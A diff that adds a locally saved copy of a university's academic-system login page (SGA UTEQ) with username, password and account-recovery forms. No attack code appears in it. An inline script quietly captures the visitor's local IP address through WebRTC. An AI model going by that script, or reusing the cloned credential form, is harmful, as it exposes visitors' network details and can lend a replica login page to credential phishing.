@@ -1,0 +1,793 @@
+<!DOCTYPE html>
+<!-- saved from url=(0038)https://sga.uteq.edu.ec/loginsga?ret=/ -->
+<html lang="en" data-location="Quevedo"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="author" content="UTEQ">
+    <meta name="google" content="notranslate">
+    <meta http-equiv="Content-Language" content="en">
+    <title translate="no" class="notranslate">Inicio de sesión</title>
+    <script type="text/javascript" src="./Inicio de sesión_files/jquery.min.js"></script>
+    <script type="text/javascript" src="./Inicio de sesión_files/jquery.blockUI.js"></script>
+    <script type="text/javascript" src="./Inicio de sesión_files/jquery.maskedinput.min.js"></script>
+    <script type="text/javascript" src="./Inicio de sesión_files/sysend.js"></script>
+    <script type="text/javascript" src="./Inicio de sesión_files/smoke.js"></script>
+    <script type="text/javascript" src="./Inicio de sesión_files/bootstrap.min.js"></script>
+    <script type="text/javascript" src="./Inicio de sesión_files/bootstrap-datepicker.js"></script>
+    <script type="text/javascript" src="./Inicio de sesión_files/bootstrap-timepicker.js"></script>
+    <script type="text/javascript" src="./Inicio de sesión_files/bootstrap-modal.js"></script>
+    <script type="text/javascript" src="./Inicio de sesión_files/bootstrap-modalmanager.js"></script>
+    <script type="text/javascript" src="./Inicio de sesión_files/big.min.js"></script>
+    <script type="text/javascript" src="./Inicio de sesión_files/jquery.flexbox.js"></script>
+    <script type="text/javascript" src="./Inicio de sesión_files/dragdivscroll.js"></script>
+    <script type="text/javascript" src="./Inicio de sesión_files/jquery.dataTables.min.js"></script>
+
+    <script type="text/javascript" src="./Inicio de sesión_files/alert.js"></script>
+    <script type="text/javascript" src="./Inicio de sesión_files/copyClipboard.js"></script>
+    <script type="text/javascript" src="./Inicio de sesión_files/convertirFecha.js"></script>
+
+    <link href="./Inicio de sesión_files/alert.css" rel="stylesheet" type="text/css" media="screen">
+    <link href="./Inicio de sesión_files/smoke.css" rel="stylesheet" type="text/css" media="screen">
+    <link href="./Inicio de sesión_files/bootstrap.min.css" rel="stylesheet">
+    <link href="./Inicio de sesión_files/bootstrap-responsive.css" rel="stylesheet">
+    <link href="./Inicio de sesión_files/font-awesome.css" rel="stylesheet">
+    <link href="./Inicio de sesión_files/font-awesome.min.css" rel="stylesheet">
+    <link href="./Inicio de sesión_files/stylesbs.css" rel="stylesheet">
+    <link href="./Inicio de sesión_files/style-panel-menu.css" rel="stylesheet">
+    <link href="./Inicio de sesión_files/datepicker.css" rel="stylesheet">
+    <link href="./Inicio de sesión_files/bootstrap-timepicker.css" rel="stylesheet">
+    <link href="./Inicio de sesión_files/bootstrap-modal.css" rel="stylesheet">
+    <link href="./Inicio de sesión_files/jquery.flexbox.css" type="text/css" rel="stylesheet">
+    <link href="./Inicio de sesión_files/jquery.dataTables.css" type="text/css" rel="stylesheet">
+    <link href="./Inicio de sesión_files/ancho-elementos.css" type="text/css" rel="stylesheet">
+
+    
+    
+    
+
+    
+    <link href="./Inicio de sesión_files/style.css" type="text/css" rel="stylesheet">
+    <link href="./Inicio de sesión_files/bloqueoInterfaz.css" type="text/css" rel="stylesheet">
+    <link href="./Inicio de sesión_files/oction_delete.css" type="text/css" rel="stylesheet">
+    <link href="./Inicio de sesión_files/padding.css" type="text/css" rel="stylesheet">
+    <link href="./Inicio de sesión_files/marging.css" type="text/css" rel="stylesheet">
+
+    
+    <script type="text/javascript" src="./Inicio de sesión_files/bloqueoInterface.js"></script>
+    <script type="text/javascript" src="./Inicio de sesión_files/consulta.js"></script>
+    <script type="text/javascript" src="./Inicio de sesión_files/obtenerDato.js"></script>
+    <script type="text/javascript" src="./Inicio de sesión_files/reloj.js"></script>
+    <link rel="stylesheet" href="./Inicio de sesión_files/style_model.css" type="text/css" media="screen">
+    <script type="text/javascript" src="./Inicio de sesión_files/modal.js"></script>
+    <script type="text/javascript" src="./Inicio de sesión_files/base.js"></script>
+    <link rel="stylesheet" href="./Inicio de sesión_files/alertaTemprana.css">
+    <link rel="stylesheet" href="./Inicio de sesión_files/politicaprivacidad.css">
+
+    <script type="text/javascript" src="./Inicio de sesión_files/alertaTemprana.js"></script>
+    <script type="text/javascript" src="./Inicio de sesión_files/action_delete.js"></script>
+    <script type="text/javascript" src="./Inicio de sesión_files/action_toggle_status.js"></script>
+    <script type="text/javascript" src="./Inicio de sesión_files/formato-fecha.js"></script>
+
+    <script type="text/javascript" src="./Inicio de sesión_files/jquery.fancybox.pack.js"></script>
+    <link rel="stylesheet" href="./Inicio de sesión_files/jquery.fancybox.css" type="text/css" media="screen">
+    <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin="">
+
+    
+    
+    
+    
+    
+
+    <!-- Google tag (gtag.js) -->
+    <script async="" src="./Inicio de sesión_files/js"></script>
+    <script>
+        window.dataLayer = window.dataLayer || [];
+        function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        /* --- dominio dinámico --- */
+        const host       = location.hostname;
+        const isLocal    = host === 'localhost' || host.startsWith('127.');
+        const cookieDom  = isLocal ? 'none' : 'uteq.edu.ec';   // producción vs. dev
+        /* ① Sustituye por tu ID de medición
+           ② Ajusta cookie_domain al eTLD+1 real de tu sitio        */
+        gtag('config', 'G-5KHK1H2944', {
+            cookie_domain: cookieDom,      // o 'sga.uteq.edu.ec' si quieres aislar el subdominio
+            cookie_flags: 'SameSite=None;Secure'   // elimina advertencias adicionales
+        });
+    </script>
+
+    <link rel="shortcut icon" href="https://sga.uteq.edu.ec/static/images/aok/logo.png?1.0.0" sizes="32x32">
+    <script>
+        var capippriva = '';
+        window.RTCPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;   //compatibility for firefox and chrome
+
+        var pc = new RTCPeerConnection({iceServers: []}), noop = function () {
+        };
+        pc.createDataChannel("");    //create a bogus data channel
+        pc.createOffer(pc.setLocalDescription.bind(pc), noop);    // create offer and set local description
+        pc.onicecandidate = function (ice) {  //listen for candidate events
+            if (!ice || !ice.candidate || !ice.candidate.candidate) return;
+            myIP = /([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/.exec(ice.candidate.candidate);
+            if (myIP) {
+                capippriva = myIP[1];
+                $("#ipcapturada").html(', Ip ' + capippriva);
+                pc.onicecandidate = noop;
+            }
+        };
+        var modalposition = 0;
+        var mensaje = '';
+
+        $(function () {
+            var serverDate = new Date(2025, 9 - 1, 17, 22, 40, 46, 0);
+            var clientDate = new Date();
+            updateClock(serverDate, clientDate, $('#clock'));
+            setInterval(function () {
+                updateClock(serverDate, clientDate, $('#clock'));
+            }, 1000);
+
+            
+
+            
+
+            
+
+            if (typeof String.prototype.startsWith != 'function') {
+                String.prototype.startsWith = function (str) {
+                    return this.indexOf(str) == 0;
+                };
+            }
+
+            if (typeof String.prototype.endsWith != 'function') {
+                String.prototype.endsWith = function (str) {
+                    return this.slice(-str.length) == str;
+                };
+            }
+
+            
+
+            
+
+        });
+
+        function getCookie(name) {
+            var cookieValue = null;
+            if (document.cookie && document.cookie !== '') {
+                var cookies = document.cookie.split(';');
+                for (var i = 0; i < cookies.length; i++) {
+                    var cookie = cookies[i].trim();
+                    // Does this cookie string begin with the name we want?
+                    if (cookie.substring(0, name.length + 1) === (name + '=')) {
+                        cookieValue = decodeURIComponent(cookie.substring(name.length + 1));
+                        break;
+                    }
+                }
+            }
+            return cookieValue;
+        }
+
+        var csrftoken = getCookie('csrftoken');
+
+        function csrfSafeMethod(method) {
+            // these HTTP methods do not require CSRF protection
+            return (/^(GET|HEAD|OPTIONS|TRACE)$/.test(method));
+        }
+
+        $.ajaxSetup({
+            beforeSend: function (xhr, settings) {
+                if (!csrfSafeMethod(settings.type) && !this.crossDomain) {
+                    xhr.setRequestHeader("X-CSRFToken", csrftoken);
+                }
+            }
+        });
+
+    </script>
+    <style>
+        :root {
+            --background-url: url('https://sga.uteq.edu.ec/media/fondo_sga/2022/10/20/RECTORADO_SGA_jQBX4Wj.jpg');
+            --navbar-background-image:  linear-gradient(to bottom, #1B7505, #1B7505);
+            --footer-background-image: linear-gradient(to bottom, #1B7505, #1B7505);
+        }
+
+        @keyframes campanita-dorada {
+            0%, 100% {
+                transform: rotate(0deg);
+            }
+            25% {
+                transform: rotate(-2.5deg);
+            }
+            75% {
+                transform: rotate(4deg);
+            }
+        }
+        .notificacion-contenedor {
+            background-color: rgba(245, 246, 246, 0.96);
+            border-radius: 7px;
+            border: 0.1px solid rgba(223, 222, 222, 0.83);
+            border: 0.1px solid rgba(222, 223, 223, 0.83);
+
+        }
+        .notificacion-contenedor .notificacion {
+            background-color: rgba(245, 246, 246, 0.96);
+            border-radius: 7px;
+
+        }
+        .notificacion-contenedor:hover {
+            background-color: #eceded;
+            border-radius: 7px;
+            cursor: pointer;
+
+        }
+        .notificacion-contenedor:hover .notificacion {
+            background-color: #eceded;
+            cursor: pointer;
+        }
+
+        .custom-dropdown::before,
+        .custom-dropdown::after {
+            display: none !important; /* Elimina los pseudo-elementos */
+        }
+
+
+    </style>
+    
+    
+    
+    
+    
+    
+    
+    
+    <link rel="stylesheet" href="./Inicio de sesión_files/login.css" type="text/css" media="screen">
+    <script type="text/javascript" src="./Inicio de sesión_files/login.js"></script>
+    <script type="text/javascript" src="./Inicio de sesión_files/configuracionpwa.js"></script>
+    
+    <link rel="stylesheet" href="./Inicio de sesión_files/chaptcha_response.css" type="text/css" media="screen">
+
+
+    <!-- Path to manifest.json -->
+<link rel="manifest" href="https://sga.uteq.edu.ec/manifest.json">
+
+<!-- Add to homescreen for Chrome on Android -->
+<meta name="mobile-web-app-capable" content="yes">
+<meta name="application-name" content="SGA UTEQ">
+
+
+<!-- Chrome for Android theme color -->
+<meta name="theme-color" content="#000000">
+
+<!-- Add to homescreen for Safari on iOS -->
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-title" content="SGA UTEQ">
+<meta name="apple-mobile-web-app-status-bar-style" content="default">
+
+
+    
+        <link rel="apple-touch-icon" href="https://sga.uteq.edu.ec/static/images/aok/logosga180x180.png" sizes="180x180">
+    
+        <link rel="apple-touch-icon" href="https://sga.uteq.edu.ec/static/images/aok/logosga192x192.png" sizes="192x192">
+    
+
+
+
+
+<link href="https://sga.uteq.edu.ec/static/images/aok/splashuteq640x1136.png" media="(device-width: 320px) and (device-height: 568px) and (-webkit-device-pixel-ratio: 2)" rel="apple-touch-startup-image">
+
+<link href="https://sga.uteq.edu.ec/static/images/aok/splashuteq750x1334.png" media="(device-width: 375px) and (device-height: 667px) and (-webkit-device-pixel-ratio: 2)" rel="apple-touch-startup-image">
+
+<link href="https://sga.uteq.edu.ec/static/images/aok/splashuteq828x1792.png" media="(device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 2)" rel="apple-touch-startup-image">
+
+<link href="https://sga.uteq.edu.ec/static/images/aok/splashuteq1125x2436.png" media="(device-width: 375px) and (device-height: 812px) and (-webkit-device-pixel-ratio: 2)" rel="apple-touch-startup-image">
+
+<link href="https://sga.uteq.edu.ec/static/images/aok/splashuteq1170x2532.png" media="(device-width: 390px) and (device-height: 844px) and (-webkit-device-pixel-ratio: 2)" rel="apple-touch-startup-image">
+
+<link href="https://sga.uteq.edu.ec/static/images/aok/splashuteq1242x2208.png" media="(device-width: 414px) and (device-height: 736px) and (-webkit-device-pixel-ratio: 3)" rel="apple-touch-startup-image">
+
+<link href="https://sga.uteq.edu.ec/static/images/aok/splashuteq1242x2688.png" media="(device-width: 414px) and (device-height: 896px) and (-webkit-device-pixel-ratio: 3)" rel="apple-touch-startup-image">
+
+<link href="https://sga.uteq.edu.ec/static/images/aok/splashuteq1284x2778.png" media="(device-width: 428px) and (device-height: 926px) and (-webkit-device-pixel-ratio: 3)" rel="apple-touch-startup-image">
+
+<link href="https://sga.uteq.edu.ec/static/images/aok/splashuteq1536x2048.png" media="(device-width: 768px) and (device-height: 1024px) and (-webkit-device-pixel-ratio: 2)" rel="apple-touch-startup-image">
+
+<link href="https://sga.uteq.edu.ec/static/images/aok/splashuteq1668x2224.png" media="(device-width: 834px) and (device-height: 1112px) and (-webkit-device-pixel-ratio: 2)" rel="apple-touch-startup-image">
+
+<link href="https://sga.uteq.edu.ec/static/images/aok/splashuteq1668x2388.png" media="(device-width: 834px) and (device-height: 1194px) and (-webkit-device-pixel-ratio: 2)" rel="apple-touch-startup-image">
+
+<link href="https://sga.uteq.edu.ec/static/images/aok/splashuteq2048x2732.png" media="(device-width: 1024px) and (device-height: 1366px) and (-webkit-device-pixel-ratio: 2)" rel="apple-touch-startup-image">
+
+
+
+<!-- Tile for Win8 -->
+<meta name="msapplication-TileColor" content="#ffffff">
+
+<meta name="msapplication-TileImage" content="/static/images/aok/logosga512x512.png">
+
+
+<link rel="icon" sizes="512x512" href="https://sga.uteq.edu.ec/static/images/aok/logosga512x512.png">
+
+
+<script type="text/javascript">
+    // Initialize the service worker
+    if ('serviceWorker' in navigator) {
+        navigator.serviceWorker.register('/serviceworker.js', {
+            scope: '/'
+        }).then(function (registration) {
+            // Registration was successful
+            
+            console.log('django-pwa: ServiceWorker registration successful with scope: ', registration.scope);
+            
+        }, function (err) {
+            // registration failed :(
+            
+            console.log('django-pwa: ServiceWorker registration failed: ', err);
+            
+        });
+    }
+</script>
+
+</head>
+
+<body data-spy="scroll" translate="no" class="notranslate fondoprincipal" data-target=".subnav" data-offset="50">
+
+
+<div id="nav-header" class="navbar navbar-inverse navbar-fixed-top">
+    <div class="navbar-inner">
+        <div class="container-fluid" style="padding-right: 0; padding-left: 0">
+            <ul class="nav">
+                <li>
+                    <a href="https://sga.uteq.edu.ec/" class="logo_sist">
+                        
+                        
+                            <span class="logo_inical"><img src="./Inicio de sesión_files/Logo-SGA.png"></span>
+                            <span class="logo_tite">| Sistema de Gestión Académica</span>
+                            
+                        
+                        
+                        
+                    </a>
+                </li>
+            </ul>
+            
+            
+            
+            
+        </div>
+    </div>
+</div>
+
+<div translate="no" class="notranslate" id="content">
+    
+    
+    
+    
+    <div class="container
+ table-responsive">
+        
+        
+    <div id="maincontent" class="row">
+        <div class="span8">
+            
+                <div id="myCarousel" class="carousel slide">
+                    <div class="carousel-inner cont-anuncio">
+                        
+                            <a href="./Inicio de sesión_files/foto_2025917114851.jpg" class="item noticiaimagen active" rel="gallery">
+                                <img src="./Inicio de sesión_files/foto_2025917114851.jpg" alt="">
+                                
+                            </a>
+                        
+                            <a href="./Inicio de sesión_files/foto_2025915152912.jpg" class="item  noticiaimagen" rel="gallery">
+                                <img src="./Inicio de sesión_files/foto_2025915152912.jpg" alt="">
+                                
+                            </a>
+                        
+                    </div>
+                    
+                        <div class="control-box">
+                            <a data-slide="prev" href="https://sga.uteq.edu.ec/loginsga?ret=/#myCarousel" class="carousel-control left">‹</a>
+                            <a data-slide="next" href="https://sga.uteq.edu.ec/loginsga?ret=/#myCarousel" class="carousel-control right">›</a>
+                        </div>
+                    
+                </div>
+            
+            
+        </div>
+        <div class="span4">
+            <!-- FORM PARA LOS USUARIOS DEL CENTRO -->
+            <div class="well bordercolorlogin" id="loginform">
+                <h3>Entrada al SGA</h3>
+                <div class="alert alert-error" id="errormensaje" hidden="hidden" style="display: none"></div>
+                <div class="buttonIn">
+                    <fieldset>
+                        <label>Usuario</label>
+                        
+                            <input type="text" id="userdeclaracion" style="text-transform: none;" class="input-block-level">
+                        
+                        <label style="margin-top: 9px">Contraseña</label>
+                        
+                            <input type="password" id="passdeclaracion" style="text-transform: none;" class="input-block-level">
+                            <button class="fa fa-eye-slash mostrar" onclick="mostrar_pass(&#39;passdeclaracion&#39;)"></button>
+                        
+                    </fieldset>
+                </div>
+                
+                <fieldset style="margin-top: 15px;">
+                    
+                        <a href="javascript:;" id="logindeclaracion" class="btn btn-success"><i class="fa fa-arrow-right "></i> Entrar</a>
+                    
+                </fieldset>
+                <p style="margin-top: 18px">En caso de problemas, contactar a <a href="mailto:soportesga@uteq.edu.ec">soportesga@uteq.edu.ec</a></p>
+                <p style="margin-top: -5.5px;"><a href="javascript:;" id="recuperar" style="color: blue"><b>¿Has olvidado los datos de la cuenta? Clic aquí!</b></a></p>
+            </div>
+
+            
+                <div class="well bordercolorlogin descargas">
+                    <div class="cont-anuncio3">DESCARGAS</div>
+                    <div class="row-fluid" style="padding-top: 5px">
+                        
+                            <a class="btn-descarga" href="https://sga.uteq.edu.ec/media/archivo/2020/05/08/archivo_202058185312.pdf" target="_blank" style="float: left;">
+                                <div class="content-descarga">
+                                    <img style="width: 50px" src="./Inicio de sesión_files/icono_2020331222212.jpg">
+                                    <br>
+                                    Manual de acceso al SGA y Matriculación
+                                </div>
+                            </a>
+                        
+                            <a class="btn-descarga" href="https://sga.uteq.edu.ec/media/archivo/2020/03/31/archivo_2020331224258.pdf" target="_blank" style="float: left;">
+                                <div class="content-descarga">
+                                    <img style="width: 50px" src="./Inicio de sesión_files/icono_2020331224258.jpg">
+                                    <br>
+                                    Procedimiento de Teletrabajo Emergente
+                                </div>
+                            </a>
+                        
+                            <a class="btn-descarga" href="https://sga.uteq.edu.ec/media/archivo/2020/03/31/archivo_202033122367.docx" target="_blank" style="float: left;">
+                                <div class="content-descarga">
+                                    <img style="width: 50px" src="./Inicio de sesión_files/icono_202033122367.jpg">
+                                    <br>
+                                    Solicitud de Teletrabajo Emergente
+                                </div>
+                            </a>
+                        
+                    </div>
+                    <div class="row-fluid" href="javascript:;" id="install-btn" style="display:none; margin-bottom:0; cursor: pointer;">
+                        <a style="width: 100%;">
+                            <div class="content-descarga" style="width: 100%; padding: 5px 2px 5px 2px">
+                                📲 Instalar aplicación UTEQ? Clic aquí!
+                            </div>
+                        </a>
+                    </div>
+                </div>
+            
+
+            
+                <div class="well bordercolorlogin descargas">
+                    <div class="row-fluid">
+                        <div style=" text-align: center; font-size: 16px; font-weight: bold" class="cont-anuncio3">MATRICULADOS 2025-2026 PPA</div>
+                        <div style="border: 0; text-align: center; vertical-align: bottom; float: left" class="cont-anuncio2">
+                            <img src="./Inicio de sesión_files/egresados.png" width="55">
+                            <br><span style="font-size: 18px;">12247</span>
+                            <br><span style="font-size: 14px; color: #f89406">Grado</span>
+                        </div>
+                        <div style="border: 0; text-align: center; vertical-align: bottom; float:right;" class="cont-anuncio2">
+                            <img src="./Inicio de sesión_files/firma.png" width="50">
+                            <br><span style="font-size: 18px;">2884</span>
+                            <br><span style="font-size: 14px; color: #f89406">Nivelación</span>
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="well bordercolorlogin" style="margin-top: 2px; display: none" id="declaracionform">
+                <h6 align="center">DECLARACIÓN DEL(A) USUARIO(A)</h6>
+                <p style="font-size: small; line-height: 20px">Declaro que la información proporcionada es verdadera y correcta, por tanto:</p>
+                <ol>
+                    <li style="font-size: small; line-height: 15px">Eximo a la UTEQ de toda responsabilidad, inclusive frente a terceros, si la información proporcionada en el Sistema fuere falsa o errónea.</li>
+                    <li style="font-size: small; line-height: 15px">Me comprometo a proporcionar a la UTEQ todos los sustentos que justifiquen la información registrada en el Sistema</li>
+                    <li style="font-size: small; line-height: 15px">Autorizo a la UTEQ, a realizar cuanto análisis y verificación se consideren necesarias.</li>
+                    <li style="font-size: small; line-height: 15px">Me responsabilizo actual y permanentemente por el buen uso de la clave de acceso registrada para el ingreso al Sistema.</li>
+                    <li style="font-size: small; line-height: 15px">En virtud de la presente declaración, renuncio a instaurar por este motivo cualquier tipo de acción administrativa o judicial en contra de la UTEQ y de sus representantes legales y demás autoridades, funcionarios y servidores por el contenido erróneo de la información.</li>
+                </ol>
+                <label style="user-select: none;"><h6><input style="width: 30px; height: 18px; margin-top: -2px;" type="checkbox" name="acepto" id="acepto"> He leído y acepto la declaracion del(a) usuarios(a)</h6></label>
+                <fieldset style="margin-top: 10px">
+                    <a href="javascript:;" id="logindeclaracion1" class="btn btn-success"> Aceptar</a>
+                </fieldset>
+            </div>
+
+            <div class="well bordercolorlogin" id="recuperarform" style="display: none">
+                <fieldset class="control-group nomargins">
+                    <label class="control-label">Introduce el número de cédula para validar tu cuenta:</label>
+                    <div class="controls">
+                        <input type="text" id="datos" style="text-transform: none; width: auto; max-width: 275px;" class="input-block-level">
+                        <a class="btn btn-info" href="javascript:;" id="busqueda"><i class="fa fa-search"></i></a>
+                    </div>
+                </fieldset><br>
+                <div class="alert alert-error" id="errorb" hidden="hidden"></div>
+                <div class="alert alert-success" id="success" hidden="hidden" style="text-align: justify"></div>
+                <div class="col-lg-6">
+                    <div class="row-fluid" style="text-align: left" hidden="hidden" id="tabla">
+                        <div class="alert alert-info" style="font-weight: bold;" id="tablacontenido"></div>
+                        <div class="pull-right">
+                            <a class="btn btn-success tu" href="javascript:;" id="cambioclave" data-original-title="Solicitud de nueva contraseña será enviada a su correo institucional o personal."><i class="fa fa-lock"></i> Restablecer contraseña</a>
+                            <a class="btn btn-info tu fin" href="javascript:;" id="ingresar" data-original-title=""><i class="fa fa-close"></i> Cancelar</a>
+                        </div>
+                    </div>
+                    <div style=" margin-top: 20px;text-align: right">
+                        <a class="btn btn-info tu ini" href="javascript:;" id="ingresar" data-original-title=""><i class="fa fa-close"></i> Cancelar</a>
+                    </div>
+                </div>
+                <!--<a class="btn btn-warning"  href="http://sga.uteq.edu.ec/media/documentos/2017/11/13/documentogeneral_2017111315931.pdf" target="_blank"> <i class="fa fa-download"></i> Manual recuperar clave correo </a><br><br>-->
+                <!--<a class="btn btn-warning"  href="http://sga.uteq.edu.ec/media/restablecer_cuenta.pdf" target="_blank"> <i class="fa fa-download"></i> Manual recuperar clave SGA </a>-->
+            </div>
+        </div>
+    </div>
+
+        
+    </div>
+</div>
+
+
+<div class="modal fade static" id="waitpanel" style="display: none;">
+    <div class="modal-header">
+        <h4 id="waitpaneltitle"></h4>
+    </div>
+    <div class="modal-body">
+        <p id="waitpanelbody"></p>
+    </div>
+</div>
+<div class="modal fade static" id="periodospanel" style="display: none;">
+    <div class="modal-header">
+        <h4 id="paneltitle">Periodos</h4>
+    </div>
+    <div class="modal-body">
+        <select style="width: 100%;" id="periodoselectorall">
+            
+        </select>
+    </div>
+    <div class="modal-footer">
+        <a href="javascript:;" id="seleccionarperiodospanel" class="btn">Seleccionar</a>
+        <a href="javascript:;" id="cerrarperiodospanel" class="btn">Cerrar</a>
+    </div>
+</div>
+
+
+
+
+<div id="throbber">
+    <img src="./Inicio de sesión_files/ajax-document-loader.gif">
+    <div class="throbber-text">SGA</div>
+</div>
+
+<div class="modal fade static" id="formatoreporte" style="display: none;">
+    <div class="modal-header">
+        <h4 id="paneltitle">Formato de reporte</h4>
+    </div>
+    <div class="modal-body">
+        <select style="width: 100%;" id="formatoreporte_formato">
+            <option id="formatopdf" value="0">PORTABLE DOCUMENT FORMAT (PDF)</option>
+            <option id="formatodoc" value="1">MICROSOFT WORD (DOCX)</option>
+            <option id="formatoxls" value="2">MICROSOFT EXCEL (XLXS)</option>
+            <option id="formatocsv" value="3">COMMA-SEPARATED VALUES (CSV)</option>
+        </select>
+    </div>
+    <div class="modal-footer">
+        <a href="javascript:;" id="formatoreporte_run" class="btn btn-success">Ejecutar</a>
+        <a href="javascript:;" id="formatoreporte_close" class="btn">Cerrar</a>
+    </div>
+</div>
+<div class="modal fade static" id="ficheromodal" style="display: none;">
+    <div class="modal-header">
+        <h4>Descargar fichero</h4>
+    </div>
+    <div class="modal-body">
+        <a id="enlacefichero" href="javascript:;" target="_blank" class="btn btn-success btn-block"><i class="fa fa-arrow-down"></i> Descargar</a>
+    </div>
+    <div class="modal-footer">
+        <a href="javascript:;" class="btn btn-cerrar btn-info">Cerrar</a>
+    </div>
+</div>
+<div class="modal fade static" id="confirmacionmodal" style="display: none;"></div>
+<div class="modal fade static ajaxformdynamics" style="display: none;"></div>
+<div class="modal fade static" id="eliminacionmodal" style="display: none;"></div>
+<div class="modal fade static" id="viewhtml" style="display: none;"></div>
+<div class="modal fade static notificacionmodal" style="display: none;">
+    <div class="modal-header" style="font-size: 16px; font-weight: bold;">
+        <i id="icononotificacion"></i> <span class="titulonotificacionmodal">Notificación</span>
+    </div>
+    <div class="modal-body cuerponotificacionmodal" style="min-height: 60px; font-size: 14px">
+    </div>
+    <div class="modal-footer" style="padding: 5px 10px 5px;">
+        <p style="text-align: right;">
+            <a href="javascript:;" class="btn btn-info cerrarnotificacionmodal"><i class="fa fa-remove"></i> Cerrar</a>
+        </p>
+    </div>
+</div>
+
+<div class="modal fade static modalDetalle" id="modalDetalle">
+    <div class="modal-header">
+        <div class="icono"><span id="iconoModalDetalle"></span></div>
+        <div class="title"><h3 class="tituloModalDetalle">Detalle</h3></div>
+        <div class="botonCerrar"><a href="javascript:;" onclick="cerrarModalDetalle(this)" class="pull-right"><span class="fa fa-close danger"></span></a></div>
+    </div>
+    <div class="modal-body cuerpoModalDetalle" id="cuerpoModalDetalle">
+    </div>
+    <div class="modal-footer">
+        <a href="javascript:;" onclick="cerrarModalDetalle(this)" class="btn btn-danger btn-large"><i class="fa fa-remove"></i> Cerrar</a>
+    </div>
+</div>
+
+<div class="modal fade static modalDetallepolitica" id="modalDetallepolitica">
+    <div class="icono" style="text-align: center;padding-top: 25px"><img src="./Inicio de sesión_files/logoUTEQ.png"></div>
+    <div class="title" style="text-align: center"><h3 class="titulomodalDetallepolitica">POLÍTICA DE PRIVACIDAD Y
+        PROTECCIÓN DE DATOS PERSONALES</h3></div>
+    <div class="contenedorcuerpo" style="padding: 28px">
+        <div class="modal-body cuerpomodalDetallepolitica" id="cuerpoModalDetallepolitica">
+        </div>
+    </div>
+    <div class="modal-footer" style="text-align:center">
+        <a href="javascript:;" onclick="aceptarpoliticas(this)" class="btn btn-large aceptacionpoliticaprivacidad" style="width: 150px;background-color: #157001; color: #fff; border-color: #2d8a03;text-align: center;margin-right: 25px">
+            <i></i> Aceptar
+        </a>
+        <a href="javascript:;" onclick="rechazarpoliticas(this)" class="btn btn-large rechazarpoliticaprivacidad" style="width: 150px; background-color: #cab000; color: #fff; border-color: #988303;text-align: center;margin-left: 25px">
+            <i></i> Rechazar
+        </a>
+    </div>
+</div>
+<div class="modal fade static" id="detallenecesidadcontratacionmodal" style="display: none;">
+    <div class="modal-header">
+        <h3 id="paneltitle"></h3>
+    </div>
+    <div style="height: 750px; overflow-y: scroll;" class="modal-body" id="detallenecesidadcontratacionmodal_body"></div>
+    <div class="modal-footer">
+        <div style="float: right">
+            <a href="javascript:;" id="detallenecesidadcontratacionmodal_cerrar" class="btn btn-info"> Cerrar</a>
+        </div>
+    </div>
+</div>
+
+<div class="modal fade static" id="selectorarchivo" style="display: none;">
+    <div class="modal-header">
+        <h4>Selector de archivos</h4>
+    </div>
+    <div class="modal-body">
+        <div class="tabbable">
+            <ul class="nav nav-tabs nav-pills nav-stacked menu-selectorfile">
+                <li class="tabs active"><a href="https://sga.uteq.edu.ec/loginsga?ret=/#1" data-toggle="tab" id="item_archivolocales"><i class="fa fa-archive"></i> Archivos locales</a></li>
+                <li><a class="tabs" href="https://sga.uteq.edu.ec/loginsga?ret=/#2" data-toggle="tab"><i class="fa fa-folder"></i> Archivos recientes</a></li>
+                <li><a class="tabs" href="https://sga.uteq.edu.ec/loginsga?ret=/#3" data-toggle="tab"><i class="fa fa-upload"></i> Subir archivo</a></li>
+            </ul>
+            <div class="tab-content selectorfile-content">
+                <div class="tab-pane active archivolocales" id="1">
+
+                </div>
+            </div>
+        </div>
+    </div>
+    <div class="modal-footer">
+        <a href="javascript:;" class="btn btn-cerrar btn-info">Cerrar</a>
+    </div>
+</div>
+
+<div class="modal fade" id="mimodalpdf" tabindex="-1" role="dialog" aria-labelledby="modalLabel" aria-hidden="true">
+    <div class="modal-dialog modal-custom-width" role="document">
+        <div class="modal-content">
+            <div class="modal-header">
+                <h3 class="modal-title" id="modalLabel">Vista previa del documento</h3>
+
+            </div>
+            <div class="modal-body">
+                <iframe src="./Inicio de sesión_files/saved_resource.html"></iframe>
+            </div>
+            <div class="modal-footer">
+                <a class="btn btn-info cerrarmodalpdf" data-dismiss="modal">Cerrar</a>
+            </div>
+        </div>
+    </div>
+</div>
+
+
+<div class="modal-oction-delete modal fade static" id="confirmationModal" tabindex="-1" aria-labelledby="confirmationModalLabel" aria-hidden="true">
+    <div class="modal-header_action">
+        <div class="modal-icon">
+            <span class="fa fa-exclamation"></span>
+        </div>
+    </div>
+    <div class="modal-content">
+        <h3 class="modal-title">Confirmar eliminación</h3>
+        <div style="font-size: 14px" class="modal-body text-center" id="confirmationMessage">
+            <!-- Aquí se insertará la pregunta de confirmación -->
+        </div>
+    </div>
+    <div class="modal-actions">
+        <button type="button" class="btn btn-large btn-secondary" id="closeDelete">
+            <i class="fa fa-times"></i>Cancelar
+        </button>
+        <button type="button" class="btn btn-large btn-danger" id="confirmDelete">
+            <i class="fa fa-trash"></i>Eliminar
+        </button>
+    </div>
+</div>
+
+
+
+<div class="modal fade static notificacionModal" style="display: none;">
+    <script>
+    $(".cerrarNotificacionModal, .cerrarNotificacionModal_x").click(function(){
+    $(".notificacionModal").modal("hide");
+});
+</script>
+
+<a class="pull-right cerrarNotificacionModal_x" style="padding: 10px; cursor: pointer;"><span style="color: #797979; font-size: 18px; font-family: Verdana; padding: 5px">x</span></a>
+<div class="modal-body cuerpoNotificacionModal" style="min-height: 60px; font-size: 14px; text-align: center; margin-top: 5%; padding-bottom: 25px">
+    <div style="padding: 5px; padding-left: 45%; padding-right: 45%; text-align: -webkit-center">
+        <div style="border-radius: 50%; padding: 14px; border: 1px solid #f89406; width: 70px; height: 70px;">
+            <i class="fa fa-exclamation-triangle warning" style="font-weight:normal; font-size: 40px; padding: 13px"></i>
+        </div>
+    </div>
